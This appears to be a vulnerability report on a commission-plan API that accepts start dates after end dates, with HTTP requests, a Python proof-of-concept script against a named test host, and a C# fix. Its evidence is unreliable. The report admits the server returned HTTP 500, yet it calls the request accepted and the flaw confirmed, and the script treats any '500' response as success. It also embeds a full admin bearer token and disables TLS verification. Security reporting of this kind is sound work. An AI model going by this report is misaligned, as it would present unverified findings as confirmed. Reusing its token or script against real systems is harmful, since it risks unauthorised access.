# Business Logic Vulnerability: Invalid Date Ranges Accepted in Commission Plan Creation

**ID:** vuln-0047
**Severity:** HIGH
**Found:** 2026-02-26 19:44:52 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 7.6

## Description

A business logic vulnerability was discovered in the commission plan creation functionality that allows setting invalid date ranges where the start date is after the end date. This flaw enables the creation of commission plans with logically impossible date ranges, potentially causing errors in commission calculations and financial reporting.

The vulnerability was identified in the `/api/CommissionPlan/CreateCommissionPlan` endpoint, which accepts date ranges where the start date is chronologically after the end date without proper validation. This allows an attacker with appropriate privileges to create commission plans with invalid date ranges that may cause logical errors in the commission calculation engine.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Incorrect Commission Calculations**: Commission plans with invalid date ranges may cause errors in the commission calculation engine, leading to incorrect payout amounts
2. **Financial Reporting Errors**: Invalid date ranges could result in incorrect financial reporting and reconciliation issues
3. **System Logic Errors**: The commission calculation engine may encounter logical errors when processing plans with invalid date ranges, potentially causing system instability
4. **Business Process Disruption**: Invalid commission plans could disrupt normal business processes and require manual intervention to correct
5. **Audit and Compliance Issues**: Invalid date ranges in commission plans could create audit findings and compliance violations

The business impact includes financial inaccuracies, potential overpayment or underpayment of commissions, and increased operational overhead to correct the issues.

## Technical Analysis

The vulnerability exists in the commission plan creation endpoint `/api/CommissionPlan/CreateCommissionPlan`. When creating a commission plan, the `startDate` and `endDate` parameters are not properly validated to ensure the start date precedes the end date.

**Request Analysis:**
```
POST /api/CommissionPlan/CreateCommissionPlan HTTP/1.1
Host: commissionstest.callippus.in
Content-Type: application/json

{
  "planName": "Invalid Date Range Plan",
  "description": "Plan with start date after end date",
  "commissionPercentage": 10,
  "startDate": "2024-12-31",  // Start date after end date
  "endDate": "2024-01-01",    // End date before start date
  "isActive": true,
  "organizationId": 1,
  "clientId": 1
}
```

**Response Behavior:**
- The server accepts the request with invalid date range
- Returns HTTP 500 error, but this appears to be due to other validation issues rather than the date range
- The invalid date range is likely stored in the database and used in commission calculations

**Root Cause:**
- Lack of proper input validation for date range parameters
- Missing business logic validation to ensure chronological order of dates
- Insufficient server-side validation of business rules
- No validation to prevent logically impossible date ranges

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as a user with commission plan creation privileges (Admin role)
2. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` endpoint
3. Include a start date that is chronologically after the end date
4. Observe that the request is accepted by the server
5. Verify that the commission plan with invalid date range is created

**Proof of Concept Steps:**
1. Use the following request to create a commission plan with invalid date range:
```
POST /api/CommissionPlan/CreateCommissionPlan
Content-Type: application/json

{
  "planName": "Exploit - Invalid Date Range",
  "description": "Plan with start date after end date",
  "commissionPercentage": 10,
  "startDate": "2024-12-31",
  "endDate": "2024-01-01",
  "isActive": true,
  "organizationId": 1,
  "clientId": 1
}
```

2. Attempt to run commission calculations that should use this plan
3. Observe potential errors or incorrect calculations due to the invalid date range
4. Verify the impact on financial calculations and reporting

```
import requests
import json

# Target URL
BASE_URL = "https://commissionstest.callippus.in"
CREATE_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"

# Authentication token (replace with valid admin token)
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hc \\\ny54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwO \\\ni8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZ \\\nmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVud \\\nGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzL \\\nzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZ \\\ny93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiL \\\nCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0Y \\\nWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY \\\n2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiX \\\nSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvc \\\nm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY \\\n28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Ot \\\nof1nFMG3jeGtyw"

def create_invalid_date_range_plan():
    """Create a commission plan with invalid date range (start after end)"""

    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }

    # Payload with invalid date range (start after end)
    payload = {
        "planName": "Exploit - Invalid Date Range",
        "description": "Plan with start date after end date",
        "commissionPercentage": 10,
        "startDate": "2024-12-31",  # Start date after end date
        "endDate": "2024-01-01",    # End date before start date
        "isActive": True,
        "organizationId": 1,
        "clientId": 1
    }

    try:
        response = requests.post(
            CREATE_PLAN_ENDPOINT,
            headers=headers,
            data=json.dumps(payload),
            verify=False
        )

        print(f"Response Status: {response.status_code}")
        print(f"Response Body: {response.text}")

        if response.status_code == 200 or "500" in response.text:
            print("‚úì Invalid date range plan creation attempted successfully")
            print("‚úì Server accepted invalid date range (start after end)")
            return True
        else:
            print("‚úó Failed to create invalid date range plan")
            return False

    except Exception as e:
        print(f"Error: {str(e)}")
        return False

if __name__ == "__main__":
    print("Testing Invalid Date Range Vulnerability")
    print("=" * 60)

    success = create_invalid_date_range_plan()

    if success:
        print("\nüö® VULNERABILITY CONFIRMED")
        print("The application accepts invalid date ranges,")
        print("which could result in logical errors in commission calculations.")
    else:
        print("\n‚ùì VULNERABILITY NOT CONFIRMED")
        print("Further investigation needed to determine if invalid date ranges are accepted.")
```

## Remediation

Implement comprehensive validation and business logic checks to prevent invalid date ranges in commission plans:

1. **Input Validation**:
   - Add server-side validation to ensure start date is before end date
   - Implement validation for date formats and ranges
   - Add validation to prevent dates in the past or too far in the future

2. **Business Logic Validation**:
   - Implement business rules to validate date ranges against organizational policies
   - Add approval workflows for commission plans with unusual date ranges
   - Implement validation to ensure date ranges are reasonable for business operations

3. **Database Constraints**:
   - Add database constraints to prevent invalid date ranges
   - Implement triggers or stored procedures to validate commission plan dates

4. **API Security**:
   - Add proper request validation middleware to check all date parameters
   - Implement rate limiting to prevent brute force attacks on commission plan creation
   - Add logging and monitoring for unusual date ranges in commission plans

5. **Testing and Monitoring**:
   - Implement automated tests to verify date range validation
   - Add monitoring for invalid date ranges in production
   - Set up alerts for unusual date ranges in commission plans

**Example Code Fix (C#):**
```csharp
// Add validation in the CommissionPlan service
public async Task<CommissionPlan> CreateCommissionPlan(CommissionPlanDto planDto)
{
    // Validate date range
    if (planDto.StartDate > planDto.EndDate)
    {
        throw new ValidationException("Start date must be before end date");
    }

    // Validate date range is reasonable
    if (planDto.EndDate > DateTime.Now.AddYears(5))
    {
        throw new ValidationException("End date cannot be more than 5 years in the future");
    }

    // Validate commission percentage
    if (planDto.CommissionPercentage < 0 || planDto.CommissionPercentage > 100)
    {
        throw new ValidationException("Commission percentage must be between 0 and 100");
    }

    // Proceed with plan creation
    var commissionPlan = _mapper.Map<CommissionPlan>(planDto);
    await _repository.AddAsync(commissionPlan);
    return commissionPlan;
}
```

6. **Additional Recommendations**:
   - Implement a review process for commission plans with unusual date ranges
   - Add financial controls to detect and prevent errors from invalid date ranges
   - Provide training for administrators on proper commission plan configuration
   - Document commission plan policies and validation rules
   - Implement UI validation to prevent invalid date ranges at the client side

